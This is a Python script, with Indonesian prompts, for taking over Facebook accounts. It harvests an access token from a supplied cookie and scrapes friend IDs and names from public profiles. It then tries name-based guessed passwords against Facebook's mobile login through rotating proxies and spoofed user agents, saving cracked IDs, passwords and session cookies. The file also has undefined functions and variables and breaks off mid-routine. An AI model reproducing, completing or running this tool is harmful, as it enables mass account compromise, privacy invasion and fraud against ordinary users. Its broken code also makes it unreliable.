# -----------------[ IMPORT-MODULE ]-------------------
import requests, json, os, sys, random, datetime, time, re
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty

from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

try:
    import rich
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Rich •"))
    os.system("pip install rich")

try:
    import requests
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Requests •"))
    os.system("pip install requests && pip install mechanize ")
# ------------------[ USER-AGENT ]-------------------#
pretty.install()
CON = sol()
ugen = []
cokbrut = []
fields = []
ses = requests.Session()
princp = []
# ------------[ INDICATION ]---------------#
(
    id,
    id2,
    loop,
    ok,
    cp,
    akun,
    oprek,
    method,
    lisensiku,
    taplikasi,
    tokenku,
    uid,
    lisensikuni,
) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss, pwnya = [], []

# ------------[ WARNA-COLOR ]--------------#
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
O = "\x1b[1;96m"
N = "\x1b[0m"
Z = "\033[1;30m"
sir = "\033[41m\x1b[1;97m"
x = "\33[m"  # DEFAULT
m = "\x1b[1;91m"  # RED +
k = "\033[93m"  # KUNING +
h = "\x1b[1;92m"  # HIJAU +
hh = "\033[32m"  # HIJAU -
u = "\033[95m"  # UNGU
kk = "\033[33m"  # KUNING -
b = "\33[1;96m"  # BIRU -
p = "\x1b[0;34m"  # BIRU +
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
P2 = "[#FFFFFF]"  # PUTIH
J2 = "[#FF8F00]"  # JINGGA
puti = '\x1b[1;97m'# WARNA-PUTIH
colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
asu = random.choice([m, h, u, b])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "Devember",
}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"


# ------------------[ MACHINE-SUPPORT ]---------------#
def asepyusup(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


# ------------------[ LOGO-LAKNAT ]-----------------#
def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;910m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r>> {H}Loading...{N} " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()


def login():
    asep()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]masukan cookie anda saran jangan pake akun pribadi[italic white]",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (MASUKAN COOKIE) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    cok = Console().input("[bold hot_pink2]   ╰─> ")
    try:
        head = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
        }
        link = ses.get(
            "https://web.facebook.com/adsmanager?_rdc=1&_rdr",
            headers=head,
            cookies={"cookie": cok},
        )
        find = re.findall("act=(.*?)&nav_source", link.text)
        if len(find) == 0:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Cookie Valid Silahkan cari cookies baru atu buat cookie Baru [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(2)
            exit()
        else:
            for x in find:
                xz = ses.get(
                    f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer",
                    headers=head,
                    cookies={"cookie": cok},
                )
                took = re.search("(EAAB\w+)", xz.text).group(1)
                open(".tok.txt", "a").write(took)
                open(".cok.txt", "a").write(cok)
                exit(
                    f"Token : {took} \ncookies aktif,jalankan ulang perintah nya dengan ketik python run.py"
                )
    except Exception as e:
        exit(e)


# ------------------[ BAGIAN-MENU ]----------------#
def menu():
    os.system("cls" if os.name == "nt" else "clear")
    asep()
    try:
        token = open(".tok.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except (IOError, KeyError, FileNotFoundError):
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]cookie invalid [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        login()
    try:
        info_datafb = ses.get(
            f"https://graph.facebook.com/me?fields=name,id&access_token={token}",
            cookies={"cookies": cok},
        ).json()
        nama = info_datafb["name"]
        uidfb = info_datafb["id"]
    except requests.exceptions.ConnectionError:
        exit(f"\nTidak ada koneksi")
    except KeyError:
        try:
            os.remove(".cok.txt")
            os.remove(".tok.txt")
        except:
            pass
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Kaya nya akun anda terkena cekpoin...! [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        os.system("cls" if os.name == "nt" else "clear")
        login()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Crack Publik [italic green] [ ON ] \n[italic green]2.[italic white] Crack Massal [italic green] [ ON ] \n[italic green]3.[italic white] Crack File [italic red] [ OFF ] \n[italic green]4.[italic white] Dump Id Ke File [italic green] [ ON ] \n[italic green]5.[italic white] Lapor Bug \n[italic green]0.[italic white] Keluar",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN MENU) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    asepyusup = Console().input("[bold hot_pink2]   ╰─> ")
    if asepyusup in ["1"]:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Gunakan uid Publik,Jangan Perivat[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (UID PUBLIK) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        idt = Console().input("[bold hot_pink2]   ╰─> ")
        dump(idt, "", {"cookie": cok}, token)
        setting()
    elif asepyusup in ["2"]:
        massal()
    elif asepyusup in ["3"]:
        crack_file()
    elif asepyusup in ["4"]:
        multi_dump()
    elif asepyusup in ["5"]:
        Gabung()
    elif asepyusup in ["0"]:
        os.system("rm -rf .tok.txt")
        os.system("rm -rf .cookie.txt")
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Sukses [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
    else:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih yang bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        exit()


def Gabung():
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]Tunggu Sedang Arah Kan ke Admin [italic white]",
            subtitle="",
            subtitle_align="left",
        )
    )
    loading()
    os.system("xdg-open https://www.facebook.com/zuck")
    time.sleep(5)
    menu()


###-----[ DUMP PUBLIK ]-----###
def dump(idt, fields, cookie, token):
    try:
        headers = {
            "connection": "keep-alive",
            "accept": "*/*",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-ch-ua-mobile": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9",
        }
        if len(id) == 0:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday)",
            }
        else:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
            }
        url = ses.get(
            f"https://graph.facebook.com/{idt}",
            params=params,
            headers=headers,
            cookies=cookie,
        ).json()
        for i in url["friends"]["data"]:
            # print(i["id"]+"|"+i["name"])
            id.append(i["id"] + "|" + i["name"])
            sys.stdout.write(f"\r sedang dump... {len(id)}"),
            sys.stdout.flush()
        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
    except:
        pass
####---------------[ DUMP MASSAL ]----------------]####
def massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'>>> {H}Mau Berapa ID ?{P} : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f">>> {H}Masukan Ids Ke {P}" +str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("Total DUMP  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit() 
###----------[ dump multi extract public ]----------###
def multi_dump():
	print()
	try:
	    os:mkdir('dump')
	except:pass
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		id_limit = int(input(f'>> {H}Mau Berapa IDs{m} ?{N} : '))
		Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Nama Dan Lokasi Untuk File Keluar\nContoh : /dump/fbid.txt\nJika ingin Di lokasi sekarang\nContoh : fbid.txt [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
		file_name = input(f'>> {H}Nama Untuk File{N} :{N} ')
#		wkwk  = ('dump/' + file_name + '.txt').replace(' ', '_')
#		xxx = open(wkwk, 'w')
		Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Id Teman Harus Publik [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
	except ValueError:
	    exit()
	if id_limit<1 or id_limit>1000:
	    exit()
	ses=requests.Session()
	id_number = 0
	for KOTG49H in range(id_limit):
		id_number+=1
		Enter_id = input(f">> {H}Masukkan Id Yang Ke {N}" + str(id_number) + f" : ")
		uid.append(Enter_id)
	for user in uid:
	    try:
	       head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
	       if len(id) == 0:
	           params = ({'access_token': token,'fields': "friends"})
	       else:
	           params = ({'access_token': token,'fields': "friends"})
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for cbrl in url['friends']['data']:
	           try:
	               cbrlx = (cbrl['id']+'|'+cbrl['name']);open(f'%s'%(file_name),'a').write(cbrl['id']+'|'+cbrl['name']+'\n')
	               abc = (cbrl['id'])
	               jj = len(id)
	               x = random.choice(colors)
	               #print(f" {x}Success Dump From : {abc}\033[0m Total ids : {jj}") 
	               if cbrlx in id:pass
	               else:id.append(cbrlx)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      Console(width=50, style="bold hot_pink2").print(Panel(f"[italic white]sukses mengumpulkan [white]{len(id)}",title=f"[bold red]>[bold yellow]>[bold green]>[hot_pink2] ids total [bold green]<[bold yellow]<[bold red]<",style=f"bold hot_pink2"))
	      Console(width=50, style="bold hot_pink2").print(Panel(f"[italic white]File You Save in [blod hot_pink2]{file_name}",title=f"[bold red]>[bold yellow]>[bold green]>[hot_pink2] SAVE [bold green]<[bold yellow]<[bold red]<",style=f"bold hot_pink2"))
	      input(f"\n [ PRESS ENTER TO GO BACK ]  ")
	      menu()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

# -------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    try:
        vin = os.listdir("dump/")
    except FileNotFoundError:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]File Tidak Temukan [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        exit()
    if len(vin) == 0:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green] BUAT DUMP DULU KETIK Y/T[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (ASEP DUMP) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        kontol = Console().input("[bold hot_pink2]   ╰─> ")
        if kontol in [""]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Pilih yang bener [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
        elif kontol in ["y", "Y"]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Dump Dulu [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        elif kontol in ["t", "T"]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Terserah lu ajah Bang [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Anda Tidak Memilki File Dump [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open("" + isi, "r").readlines()
            except:
                continue
            cih += 1
            if cih < 100:
                nom = "" + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                print(f"%s. %s ({h} %s{x} idz )" % (nom, isi, len(hem)))
            else:
                lol.update({str(cih): str(isi)})
                print(
                    "["
                    + str(cih)
                    + "] "
                    + isi
                    + " [ "
                    + str(len(hem))
                    + " Account ]"
                    + H
                )
                print(" %s. %s ({h} %s {x}idz) " % (cih, isi, len(hem)))
        geeh = input("\nPilih : ")
        try:
            geh = lol[geeh]
        except KeyError:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Pilih yang bener [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        try:
            lin = open("" + geh, "r").read().splitlines()
        except:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Cek Aing Ge Dump Hela [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(2)
            exit()
        for xid in lin:
            id.append(xid)
        setting()


# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    print("")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Urutan Olid ke New \n[italic green]2.[italic white] Urutan New ke olid \n[italic green]3.[italic white] Random ",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN URUTAN) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    hu = Console().input("[bold hot_pink2]   ╰─> ")
    if hu in ["1", "01"]:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ["2", "02"]:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih Yang Bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        exit()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Validate",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN METHODE) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    hc = Console().input("[bold hot_pink2]   ╰─> ")
    if hc in ["1", "01"]:
        method.append("async")
    elif hc in [""]:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih Yang Bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        setting()
    else:
        method.append("async")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic white]Password Tambahan Pilih [italic green](Y atu T)[italic white]",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (PASSWORD) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    pwplus = Console().input("[bold hot_pink2]   ╰─> ")
    if pwplus in ["y", "Y"]:
        pwpluss.append("ya")
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Masukan kata sandi tambahan contoh [italic green]Bagong,Ngentod[italic white]\nSaran kata sandi daeraah Target Contoh [italic green]kalimantan,bandung,jonggol[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (TAMBAHKAN PASSWORD) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        pwku = Console().input("[bold hot_pink2]   ╰─> ")
        pwkuh = pwku.split(",")
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append("no")
    passwrd()


# -------------------[ BAGIAN-WORDLIST ]------------#
def passwordlist():
	global prog,des
	x_shinchan('──'* 25)
	print(f'            {puti} [WAITING•TUNGGULAH]           ')
	x_shinchan('──'* 25)
	with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
						
				else:
					if len(frs)<3:
						pwx.append(nmf)
					else:
						pwx.append(nmf)
					pwx.append(frs+frs)
					pwx.append(frs+'123')
					pwx.append(frs+'1234')
					pwx.append(frs+'12345')
					pwx.append(frs+'123456')
					pwx.append(frs+'321')
					pwx.append(frs+'01')
					pwx.append(frs+'02')
					pwx.append(frs+'03')
					pwx.append(frs+'04')
					pwx.append(frs+'05')
					pwx.append(frs+'06')
					pwx.append(frs+'07')
					pwx.append(frs+'08')
					pwx.append(frs+'09')
					pwx.append(frs+'10')
					pwx.append(frs+'12')
					pwx.append(frs+'99')
					
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwx.append(xpwd)
				else:pass
				if 'B-API' in method:
				    pool.submit(crack,idf,pwv)
				elif 'kontol' in method:
				    pool.submit(xshinchan,idf,pwx)
				elif 'validate' in method:
				    pool.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	bo = random.choice([hijo,KON,])
	rc = random.choice
	sys.stdout.write(f"\r{bo}𝙍𝙖𝙯𝙤𝙧 𝙓𝙙 🕸{puti}{puti}[{loop}]{puti}{puti}[{hijo}{len(id)}{puti}][{puti}ok:{puti}{hijo}{ok}{P}][{puti}cp:{puti}{kun}{cp}{P}]{puti}{P}[{bo}{idf}{P}]")
	ses = requests.Session()
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			rr = random.randint
			ua = random.choice(ugen)
			ua2 = rc(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
			link = ses.get("https://m.prod.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v13.0/dialog/oauth?display=popup&response_type=code&client_id=1228878007175405&redirect_uri=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook&state=adb3174a9d95b35b079097f6fc72338f&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=fc06039c-fdb6-4206-aca9-fe761849929a&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('XSHIN-OK/'+'XSHIN-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('XSHIN-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
